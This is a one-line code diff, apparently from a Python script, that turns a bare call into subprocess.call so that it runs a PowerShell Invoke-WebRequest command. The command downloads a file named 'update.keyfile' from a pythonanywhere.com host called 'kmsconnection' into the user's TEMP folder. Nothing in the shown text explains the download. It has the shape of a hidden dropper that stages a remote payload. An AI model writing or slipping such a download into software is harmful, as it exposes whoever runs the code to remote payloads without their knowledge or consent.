@@ -1,1 +1,1 @@
-call('Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/update.keyfile" -OutFile "$env:TEMP\update.keyfile"', shell='True')
+subprocess.call('Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/update.keyfile" -OutFile "$env:TEMP\update.keyfile"', shell='True')
